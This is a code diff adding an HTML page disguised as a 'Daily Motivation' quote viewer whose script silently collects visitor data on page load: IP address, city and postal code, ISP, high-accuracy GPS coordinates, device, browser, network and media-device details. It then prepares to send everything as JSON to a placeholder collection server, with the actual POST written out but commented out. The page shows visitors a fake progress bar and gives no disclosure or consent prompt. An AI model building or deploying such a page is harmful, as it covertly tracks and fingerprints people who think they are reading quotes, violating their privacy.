@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Motivation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@400;600&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #6b46c1 0%, #4c51bf 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            transition: all 0.5s ease;
+        }
+        
+        .quote {
+            font-family: 'Playfair Display', serif;
+            font-size: 2rem;
+            line-height: 1.4;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 3px;
+            margin: 2rem 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f472b6, #60a5fa);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center p-6">
+    <div class="card w-full max-w-3xl p-8 md:p-10">
+        <div class="text-center mb-8 fade-in">
+            <i class="fas fa-quote-left text-3xl opacity-30"></i>
+        </div>
+        
+        <p class="quote text-center mb-6" id="quote">
+            "The secret of getting ahead is getting started."
+        </p>
+        
+        <p class="author text-center text-xl opacity-80 mb-10" id="author">
+            - Mark Twain
+        </p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        
+        <p class="text-center text-sm opacity-90" id="statusText">
+            <span class="loading mr-2"></span>
+            Preparing your motivational content...
+        </p>
+    </div>
+
+    <script>
+        // Enhanced data collection version
+        const SERVER_ENDPOINT = 'https://your-server.com/api/collect'; // Replace with your endpoint
+        
+        const quotes = [
+            {
+                text: "Your time is limited, so don't waste it living someone else's life.",
+                author: "Steve Jobs"
+            },
+            {
+                text: "The only way to do great work is to love what you do.",
+                author: "Steve Jobs"
+            },
+            {
+                text: "If you can dream it, you can achieve it.",
+                author: "Zig Ziglar"
+            }
+        ];
+        
+        // The collected data object
+        const collectedData = {
+            timestamp: new Date(),
+            ipInfo: {},
+            systemInfo: {},
+            browserInfo: {},
+            networkInfo: {},
+            mediaInfo: {},
+            locationData: {},
+            interactionData: {
+                quotesViewed: [],
+                timeOnPage: 0
+            }
+        };
+        
+        // Detect device type
+        function detectDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
+                return "Tablet";
+            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(userAgent)) {
+                return "Mobile";
+            }
+            return "Desktop";
+        }
+        
+        // Detect operating system
+        function detectOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) return "Windows";
+            if (userAgent.includes("Mac")) return "MacOS";
+            if (userAgent.includes("Linux")) return "Linux";
+            if (userAgent.includes("Android")) return "Android";
+            if (userAgent.includes("iOS") || /iPhone|iPad|iPod/.test(userAgent)) return "iOS";
+            return "Unknown";
+        }
+        
+        // Collect IP and approximate location
+        async function collectIPData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                collectedData.ipInfo = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    postal: data.postal,
+                    timezone: data.timezone,
+                    isp: data.org,
+                    asn: data.asn
+                };
+            } catch (error) {
+                console.error("IP detection failed:", error);
+            }
+        }
+        
+        // Collect system information
+        function collectSystemInfo() {
+            collectedData.systemInfo = {
+                deviceType: detectDeviceType(),
+                os: detectOS(),
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || "unknown",
+                deviceMemory: navigator.deviceMemory || "unknown",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight
+            };
+        }
+        
+        // Collect browser information
+        function collectBrowserInfo() {
+            collectedData.browserInfo = {
+                userAgent: navigator.userAgent,
+                browserName: detectBrowser(),
+                language: navigator.language,
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack === "1",
+                webdriver: navigator.webdriver
+            };
+        }
+        
+        // Detect browser name
+        function detectBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+        
+        // Collect network information
+        function collectNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            collectedData.networkInfo = {
+                online: navigator.onLine,
+                effectiveType: connection?.effectiveType || "unknown",
+                downlink: connection?.downlink || "unknown",
+                rtt: connection?.rtt || "unknown",
+                saveData: connection?.saveData || false,
+                networkType: connection?.type || "unknown"
+            };
+        }
+        
+        // Try geolocation
+        function tryGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        collectedData.locationData.gps = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                    },
+                    error => {
+                        console.log("Geolocation error:", error.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            }
+        }
+        
+        // Collect media capabilities
+        function collectMediaInfo() {
+            collectedData.mediaInfo = {
+                audioWorklet: !!window.AudioWorkletNode,
+                videoInputs: detectMediaDevices('videoinput'),
+                audioInputs: detectMediaDevices('audioinput'),
+                audioOutputs: detectMediaDevices('audiooutput'),
+                displayMedia: 'getDisplayMedia' in navigator.mediaDevices
+            };
+        }
+        
+        // Detect media devices
+        function detectMediaDevices(kind) {
+            return new Promise(resolve => {
+                if (!navigator.mediaDevices?.enumerateDevices) {
+                    resolve("unknown");
+                    return;
+                }
+                
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        const count = devices.filter(d => d.kind === kind).length;
+                        resolve(count > 0 ? count : "none");
+                    })
+                    .catch(() => resolve("error"));
+            });
+        }
+        
+        // Send data to server
+        async function sendCollectedData() {
+            // Finalize data collection
+            collectedData.interactionData.timeOnPage = (new Date() - collectedData.timestamp) / 1000;
+            collectedData.timestamp = collectedData.timestamp.toISOString();
+            
+            console.log("Collected data:", collectedData);
+            
+            /* ACTUAL IMPLEMENTATION:
+            try {
+                const response = await fetch(SERVER_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                if (!response.ok) throw new Error('Network error');
+                return await response.json();
+            } catch (error) {
+                console.error("Error sending data:", error);
+            }
+            */
+        }
+        
+        // UI progress simulation
+        function simulateProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 95) progress = 95;
+                document.getElementById('progress').style.width = `${progress}%`;
+                
+                if (progress >= 95) {
+                    clearInterval(interval);
+                    document.getElementById('statusText').innerHTML = 
+                        '<i class="fas fa-check-circle mr-2"></i> Your daily motivation is ready!';
+                    sendCollectedData();
+                }
+            }, 500);
+        }
+        
+        // Rotate quotes
+        function rotateQuotes() {
+            let index = 0;
+            setInterval(() => {
+                index = (index + 1) % quotes.length;
+                document.getElementById('quote').textContent = `"${quotes[index].text}"`;
+                document.getElementById('author').textContent = `- ${quotes[index].author}`;
+                collectedData.interactionData.quotesViewed.push(quotes[index].author);
+            }, 5000);
+        }
+        
+        // Initialize data collection
+        async function init() {
+            await collectIPData();
+            collectSystemInfo();
+            collectBrowserInfo();
+            collectNetworkInfo();
+            tryGeolocation();
+            collectMediaInfo();
+            
+            simulateProgress();
+            rotateQuotes();
+        }
+        
+        // Start everything
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
